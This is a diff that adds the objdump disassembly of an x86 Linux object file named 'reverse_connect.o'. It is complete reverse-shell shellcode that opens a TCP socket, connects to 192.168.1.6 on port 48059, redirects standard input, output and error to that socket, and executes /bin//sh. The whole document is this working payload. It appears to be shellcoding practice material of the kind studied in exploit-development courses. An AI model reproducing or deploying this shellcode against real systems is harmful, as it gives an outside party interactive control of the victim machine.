@@ -1,0 +1,55 @@
+
+reverse_connect.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:	31 c0                	xor    %eax,%eax
+   2:	31 db                	xor    %ebx,%ebx
+   4:	31 d2                	xor    %edx,%edx
+   6:	50                   	push   %eax
+   7:	6a 01                	push   $0x1
+   9:	6a 02                	push   $0x2
+   b:	89 e1                	mov    %esp,%ecx
+   d:	fe c3                	inc    %bl
+   f:	b0 66                	mov    $0x66,%al
+  11:	cd 80                	int    $0x80
+  13:	89 c6                	mov    %eax,%esi
+  15:	c6 04 24 c0          	movb   $0xc0,(%esp)
+  19:	c6 44 24 01 a8       	movb   $0xa8,0x1(%esp)
+  1e:	c6 44 24 02 01       	movb   $0x1,0x2(%esp)
+  23:	c6 44 24 03 06       	movb   $0x6,0x3(%esp)
+  28:	66 68 bb bb          	pushw  $0xbbbb
+  2c:	31 c9                	xor    %ecx,%ecx
+  2e:	b1 02                	mov    $0x2,%cl
+  30:	66 51                	push   %cx
+  32:	89 e1                	mov    %esp,%ecx
+  34:	6a 10                	push   $0x10
+  36:	51                   	push   %ecx
+  37:	56                   	push   %esi
+  38:	89 e1                	mov    %esp,%ecx
+  3a:	b3 03                	mov    $0x3,%bl
+  3c:	b0 66                	mov    $0x66,%al
+  3e:	cd 80                	int    $0x80
+  40:	89 f3                	mov    %esi,%ebx
+  42:	31 c9                	xor    %ecx,%ecx
+  44:	b0 3f                	mov    $0x3f,%al
+  46:	cd 80                	int    $0x80
+  48:	41                   	inc    %ecx
+  49:	b0 3f                	mov    $0x3f,%al
+  4b:	cd 80                	int    $0x80
+  4d:	41                   	inc    %ecx
+  4e:	b0 3f                	mov    $0x3f,%al
+  50:	cd 80                	int    $0x80
+  52:	31 c0                	xor    %eax,%eax
+  54:	50                   	push   %eax
+  55:	68 2f 2f 73 68       	push   $0x68732f2f
+  5a:	68 2f 62 69 6e       	push   $0x6e69622f
+  5f:	89 e3                	mov    %esp,%ebx
+  61:	50                   	push   %eax
+  62:	53                   	push   %ebx
+  63:	89 e1                	mov    %esp,%ecx
+  65:	31 d2                	xor    %edx,%edx
+  67:	b0 0b                	mov    $0xb,%al
+  69:	cd 80                	int    $0x80
